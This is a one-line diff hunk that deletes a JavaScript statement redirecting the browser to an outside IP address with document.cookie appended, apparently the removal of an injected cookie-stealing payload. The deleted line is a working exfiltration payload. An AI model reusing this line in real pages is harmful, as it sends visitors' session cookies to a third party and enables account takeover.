@@ -1,1 +1,0 @@
-location = `http://3.143.222.232/?${document.cookie}`;
